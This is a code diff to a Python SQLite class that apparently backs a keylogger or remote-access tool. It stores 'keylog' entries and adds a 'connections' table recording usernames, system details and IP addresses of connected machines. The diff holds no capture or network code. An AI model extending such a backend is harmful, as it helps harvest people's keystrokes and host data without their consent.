@@ -13,13 +13,27 @@ class DB:
         self._create_table()
 
     def _create_table(self):
+        # CREATE TABLE IF NOT EXISTS logs (
+        #                 id INTEGER PRIMARY KEY AUTOINCREMENT,
+        #                 timestamp TEXT NOT NULL,
+        #                 keylog TEXT NOT NULL,
+        #                 username TEXT NOT NULL,
+        #                 machine TEXT NOT NULL DEFAULT 'unknown'
+        #             )
         self.cursor.execute('''
-            CREATE TABLE IF NOT EXISTS logs (
+            
+            CREATE TABLE IF NOT EXISTS connections (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
-                timestamp TEXT NOT NULL,
-                keylog TEXT NOT NULL,
-                username TEXT NOT NULL,
-                machine TEXT NOT NULL DEFAULT 'unknown'
+                status TEXT DEFAULT 'active',
+                timestamp INTEGER NOT NULL,
+                username TEXT,
+                processor TEXT,
+                system TEXT,
+                node TEXT,
+                release TEXT,
+                version TEXT,
+                machine TEXT,
+                ip_address TEXT      
             )
         ''')
         self.conn.commit()
@@ -30,6 +44,22 @@ class DB:
             INSERT INTO logs (timestamp, keylog, username, machine)
             VALUES (?, ?, ?, ?)
         ''', (timestamp, keylog, username, machine))
+        self.conn.commit()
+
+    def init_connection(self, timestamp, username, processor, system, node, release, version, machine, ip_address):
+        new = self.cursor.execute('''
+            INSERT INTO connections (timestamp, username, processor, system, node, release, version, machine, ip_address)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (timestamp, username, processor, system, node, release, version, machine, ip_address))
+        self.conn.commit()
+        return new.lastrowid
+
+    def close_connection(self, connection_id):
+        self.cursor.execute('''
+            UPDATE connections
+            SET status = 'closed'
+            WHERE id = ?
+        ''', (connection_id,))
         self.conn.commit()
 
     def fetch_logs(self, offset=0, limit=None):
